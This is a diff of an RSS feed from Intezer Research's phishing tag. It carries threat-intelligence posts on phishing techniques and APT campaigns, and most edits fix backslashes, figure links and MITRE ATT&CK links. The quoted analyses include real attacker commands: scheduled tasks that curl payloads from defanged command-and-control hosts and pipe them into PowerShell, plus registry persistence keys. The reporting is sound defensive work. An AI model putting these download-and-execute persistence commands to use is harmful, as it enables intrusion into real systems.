@@ -1,4 +1,4 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research – Phishing</title><link>https://research.intezer.com/tags/phishing/</link><description>Recent content in Phishing on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 23 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/tags/phishing/index.xml" rel="self" type="application/rss+xml"/><item><title>Emerging Phishing Techniques New Threats and Attack Vectors</title><link>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</link><pubDate>Wed, 23 Apr 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</guid><description>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research – Phishing</title><link>https://research.intezer.com/tags/phishing/</link><description>Recent content in Phishing on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 23 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/tags/phishing/index.xml" rel="self" type="application/rss+xml"/><item><title>Emerging Phishing Techniques: New Threats and Attack Vectors</title><link>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</link><pubDate>Wed, 23 Apr 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</guid><description>
 &lt;p&gt;Phishing remains
 &lt;a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/common-cyberattacks/"target="_blank" rel="noopener"&gt;one of the most prevalent&lt;/a&gt;
 and successful attack vectors used by cybercriminals today. It exploits human
@@ -68,7 +68,8 @@ credential-harvesting page.&lt;/li&gt;
 &lt;p&gt;This multi-layered obfuscation allowed the payload to bypass most static
 analysis engines.&lt;/p&gt;
 &lt;p&gt;For this analysis, the Intezer research team developed a custom tool to analyze
-this technique in SVG files.&lt;/p&gt;
+this technique in SVG files:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig4.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Findings&lt;span class="hx:absolute hx:-mt-20" id="findings"&gt;&lt;/span&gt;
 &lt;a href="#findings" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When using the tool, we found that:&lt;/p&gt;
 &lt;ul&gt;
@@ -90,9 +91,10 @@ metadata, allowing them to bypass email security tools and remain undetected by
 most scanning solutions. The phishing emails delivering these PDFs successfully
 passed through multiple email security filters, reaching users’ inboxes without
 any warnings.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;How the PDF Format Works&lt;span class="hx:absolute hx:-mt-20" id="how-the-pdf-format-works"&gt;&lt;/span&gt;
-&lt;a href="#how-the-pdf-format-works" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The PDF format is built on a [structured and modular
-architecture],(&lt;a href="https://intezer.com/blog/incident-response/analyze-malicious-pdf-files/"target="_blank" rel="noopener"&gt;https://intezer.com/blog/incident-response/analyze-malicious-pdf-files/&lt;/a&gt;)
+&lt;a href="#how-the-pdf-format-works" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The PDF format is built on a &lt;a href="https://intezer.com/blog/incident-response/analyze-malicious-pdf-files/"target="_blank" rel="noopener"&gt;structured and modular
+architecture&lt;/a&gt;,
 making it flexible for both rendering content and embedding interactive
 features. Each PDF file consists of a collection of objects, including text,
 images, fonts, scripts, annotations, and more organized in a hierarchical
@@ -152,7 +154,7 @@ automated tools not designed to extract URLs from non-standard locations in a
 PDF.&lt;/p&gt;
 &lt;h3&gt;Analysis&lt;span class="hx:absolute hx:-mt-20" id="analysis-1"&gt;&lt;/span&gt;
 &lt;a href="#analysis-1" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;IOC: 252422de154885806f491d602af3bb2eda10563308c65fa5ba8272a9b59f7f41
-(VirusTotal)&lt;/p&gt;
+(&lt;a href="https://www.virustotal.com/gui/file/252422de154885806f491d602af3bb2eda10563308c65fa5ba8272a9b59f7f41"target="_blank" rel="noopener"&gt;VirusTotal&lt;/a&gt;)&lt;/p&gt;
 &lt;p&gt;Upon analyzing the malicious PDF file, we discovered that:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;The phishing URL was stored inside an annotation object within the /Annots
@@ -165,8 +167,8 @@ to be delivered directly to users.&lt;/li&gt;
 security vendor flagged it as malicious, and the malicious PDF bypassed
 security vendors and went straight to the victim’s mailbox.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig4.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig6.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig7.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;To extract the hidden URL, we performed the following steps using a custom PDF
 URL analyzer built by the Intezer research team:&lt;/p&gt;
 &lt;ul&gt;
@@ -178,8 +180,9 @@ objects that contained hyperlinks.&lt;/li&gt;
 malicious indicators and phishing databases using a custom tool we built and
 Intezer’s platform.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig6.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig7.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig8.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig9.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig10.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Findings&lt;span class="hx:absolute hx:-mt-20" id="findings-1"&gt;&lt;/span&gt;
 &lt;a href="#findings-1" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the analysis we conducted, we found that:&lt;/p&gt;
 &lt;ul&gt;
@@ -204,6 +207,7 @@ host phishing content, making detection more challenging. Instead of directly
 sending a phishing URL, attackers share a read-only OneDrive link that appears
 benign but contains an embedded malicious URL that executes dynamically within
 JavaScript when loaded.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig11.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Why This Attack is Difficult to Detect&lt;span class="hx:absolute hx:-mt-20" id="why-this-attack-is-difficult-to-detect"&gt;&lt;/span&gt;
 &lt;a href="#why-this-attack-is-difficult-to-detect" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This attack is challenging to detect due to how OneDrive renders shared
 documents:&lt;/p&gt;
@@ -266,7 +270,7 @@ documents (e.g., &lt;code&gt;.docx&lt;/code&gt;) to deliver phishing payloads. M
 archive web content and can store complete HTML documents, including images,
 links, and scripts. This makes them ideal for hiding phishing lures inside
 seemingly harmless Office files.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig8.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig12.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;The phishing emails delivering these &lt;code&gt;.docx&lt;/code&gt; files successfully bypassed
 multiple email security filters and landed in user inboxes undetected.&lt;/p&gt;
 &lt;h3&gt;How OpenXML Documents Work&lt;span class="hx:absolute hx:-mt-20" id="how-openxml-documents-work"&gt;&lt;/span&gt;
@@ -307,6 +311,7 @@ bypassed traditional email scanners and static link analysis tools.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;We’ve conducted this analysis using a custom tool we developed. It extracts all
 the MHT files inside and decodes the QR code. The image below shows the output:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig13.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Findings&lt;span class="hx:absolute hx:-mt-20" id="findings-3"&gt;&lt;/span&gt;
 &lt;a href="#findings-3" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;After using the tool we developed to conduct our analysis, we found that:&lt;/p&gt;
 &lt;ul&gt;
@@ -456,7 +461,7 @@ actor the name of the infected machine. These tactics have been observed being
 used by Bitter APT in
 &lt;a href="https://blog.talosintelligence.com/bitter-apt-adds-bangladesh-to-their/"target="_blank" rel="noopener"&gt;2021/2022&lt;/a&gt;.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:WindowsSystem32schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%\dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -469,13 +474,13 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="images/fig4" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig4.png" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 4: Scheduled task&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The second scheduled task created attempts to execute the payload downloaded by
 the other task:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%\dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -520,7 +525,7 @@ data-copied-label="Copied!"
 &lt;p&gt;We did not fetch any additional payloads from the C2, but we were served empty
 MSI files, allowing us to discover the names of the next stage payloads.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="images/fig5" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig5.png" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 5: Empty payloads served from different C2 servers&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;This may allow the actor to examine the server logs of beaconing infected
@@ -542,7 +547,7 @@ concatenation.&lt;/p&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The decoded command is the following:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%\pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%\pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%\pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -639,67 +644,67 @@ data-copied-label="Copied!"
 &lt;tr&gt;
 &lt;td&gt;Reconnaissance&lt;/td&gt;
 &lt;td&gt;Email Addresses&lt;/td&gt;
-&lt;td&gt;T1589.002&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1589/002"target="_blank" rel="noopener"&gt;T1589.002&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;The actor gathers target email addresses to target with spearphishing emails&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Initial Access&lt;/td&gt;
 &lt;td&gt;Spearphishing Attachment&lt;/td&gt;
-&lt;td&gt;T1566.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1566/001"target="_blank" rel="noopener"&gt;T1566.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Spearphishing is used to deliver RAR attachments&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Execution&lt;/td&gt;
 &lt;td&gt;PowerShell&lt;/td&gt;
-&lt;td&gt;T1059.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1059/001"target="_blank" rel="noopener"&gt;T1059.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Encoded PowerShell is used by CHM payload&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Execution&lt;/td&gt;
 &lt;td&gt;Exploitation for Client Execution&lt;/td&gt;
-&lt;td&gt;T1203&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1203"target="_blank" rel="noopener"&gt;T1203&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Microsoft Office exploits are used to execute code&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Persistence&lt;/td&gt;
 &lt;td&gt;Scheduled Task&lt;/td&gt;
-&lt;td&gt;T1053.005&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1053/005"target="_blank" rel="noopener"&gt;T1053.005&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Scheduled Tasks used for both execution and persistence&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Msiexec&lt;/td&gt;
-&lt;td&gt;T1218.007&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1218/007"target="_blank" rel="noopener"&gt;T1218.007&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Msiexec is used to launch next stage payloads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Compiled HTML File&lt;/td&gt;
-&lt;td&gt;T1218.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1218/001"target="_blank" rel="noopener"&gt;T1218.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;CHM files are used to deliver payloads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Masquerading&lt;/td&gt;
-&lt;td&gt;T1036&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1036"target="_blank" rel="noopener"&gt;T1036&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Files are masqueraded as legitimate files and scheduled tasks are named after common tasks (eg. Adobe Updater)&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Discovery&lt;/td&gt;
 &lt;td&gt;System Information Discovery&lt;/td&gt;
-&lt;td&gt;T1082&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1082"target="_blank" rel="noopener"&gt;T1082&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;First stage payloads fetch Computer and User names&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Command and Control&lt;/td&gt;
 &lt;td&gt;Web Protocols&lt;/td&gt;
-&lt;td&gt;T1071.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1071/001"target="_blank" rel="noopener"&gt;T1071.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;HTTPS is used for C2 communication&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Command and Control&lt;/td&gt;
 &lt;td&gt;Exfiltration Over C2 Channel&lt;/td&gt;
-&lt;td&gt;T1041&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1041"target="_blank" rel="noopener"&gt;T1041&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Data can be exfiltrated&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
@@ -854,7 +859,7 @@ screenshot below shows the malware using the &lt;code&gt;Wait&lt;/code&gt; funct
 seconds before allocating 200 mb of garbage data.&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/04/elephant-malware-targeting-ukrainian-orgs/images/fig3.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;Persistence is established by adding a new key entry with the name &lt;code&gt;Java-3DK&lt;/code&gt;
-to the registry key &lt;code&gt;SoftwareMicrosoftWindowsCurrentVersionRun&lt;/code&gt;. After this,
+to the registry key &lt;code&gt;Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;. After this,
 the malware checks if a new binary exists by comparing its MD5 hash with a hash
 from the server. If no update is needed, it downloads the other two components.&lt;/p&gt;
 &lt;p&gt;The downloader has some 3rd party libraries, whose metadata are listed in the
@@ -951,7 +956,7 @@ IP address, hostname, username, etc. In addition to the heartbeat message, the
 malware starts the &amp;ldquo;command&amp;rdquo; loop that checks for new commands to execute every
 3 seconds. If a command is received it executes it by spawning a PowerShell
 instance by executing
-&lt;code&gt;%windir%\SysWOW64\Windows\PowerShell\v1.0\powershell.exe&lt;/code&gt; and returns the
+&lt;code&gt;%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&lt;/code&gt; and returns the
 result to the C2 server.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;service Implant {
@@ -1075,8 +1080,8 @@ C7051e88ae43c1bd4b869cf18280ec5e
 40b42005e9cfc5ea2a7cfc1ced975cbb
 Fbe3cb4dfce740c3728c459b853e4249 (email submitted and target Romania)
 Paths
-%HOME%AppDataLocalTempBase-Update.exe
-%HOME%.java-sdk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+%HOME%\AppData\Local\Temp\Base-Update.exe
+%HOME%\.java-sdk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -1113,7 +1118,7 @@ used to deploy another malware at the &amp;ldquo;purchaser&amp;rsquo;s request.&
 is IcedID (BokBot). IcedID was first reported on by
 &lt;a href="https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/"target="_blank" rel="noopener"&gt;IBM X-Force in November 2017&lt;/a&gt;
 and the malware
-&lt;a href="https://intezer.com/blog/research/icedid-banking-trojan-shares-code-pony-2-0-trojan/"target="_blank" rel="noopener"&gt;shared some code with Pony&lt;/a&gt;.
+&lt;a href="../../../2017/11/icedid-banking-trojan-shares-code-pony-2-0-trojan/"&gt;shared some code with Pony&lt;/a&gt;.
 While initially designed to steal banking credentials, like many other banking
 trojans, the malware has been repurposed for deploying other malware on the
 infected machines.&lt;/p&gt;
@@ -1491,13 +1496,13 @@ regions gives us reason to believe that Russia is behind the attack.&lt;/p&gt;
 &lt;li&gt;Victimology: APT28 has targeted Ukraine and Georgia in the past. &lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;[1]&lt;/a&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;[2]&lt;/a&gt;&lt;a href="https://securelist.com/greyenergys-overlap-with-zebrocy/89506/"target="_blank" rel="noopener"&gt;[3]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Phishing theme: APT28 previously used COVID-19-related phishing themes to
 target countries including Ukraine. APT28 also used NATO as a phishing theme
-in the past. &lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;[1]&lt;/a&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;[2]&lt;/a&gt;&lt;a href="https://intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"target="_blank" rel="noopener"&gt;[4]&lt;/a&gt;&lt;a href="https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/"target="_blank" rel="noopener"&gt;[5]&lt;/a&gt;&lt;/li&gt;
+in the past. &lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;[1]&lt;/a&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;[2]&lt;/a&gt;&lt;a href="../../../2020/12/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"&gt;[4]&lt;/a&gt;&lt;a href="https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/"target="_blank" rel="noopener"&gt;[5]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Use of AutoIt: One of Zebrocy&amp;rsquo;s (malware from APT28) variants is written in
 AutoIt. &lt;a href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/"target="_blank" rel="noopener"&gt;[6]&lt;/a&gt;&lt;a href="https://vk-intel.org/2019/01/22/lets-learn-progression-of-apt28-autoit-zebrocy-downloaders-source-code-level-analysis/"target="_blank" rel="noopener"&gt;[7]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;File search with predefined extensions: Zebrocy searches for predefined file
 extensions on the victim machine. &lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;a href="https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/"target="_blank" rel="noopener"&gt;[9]&lt;/a&gt;&lt;a href="https://attack.mitre.org/software/S0251/"target="_blank" rel="noopener"&gt;[13]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Compressed file holding both malicious and benign files was used in an APT28
-COVID-19 phishing attack last year and in other campaigns in the past. &lt;a href="https://intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"target="_blank" rel="noopener"&gt;[4]&lt;/a&gt;&lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;/li&gt;
+COVID-19 phishing attack last year and in other campaigns in the past. &lt;a href="../../../2020/12/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"&gt;[4]&lt;/a&gt;&lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Use of spear phishing emails containing URL-shortener was documented in past
 APT28 campaigns. In one of the campaigns, this URL hosted a ZIP file
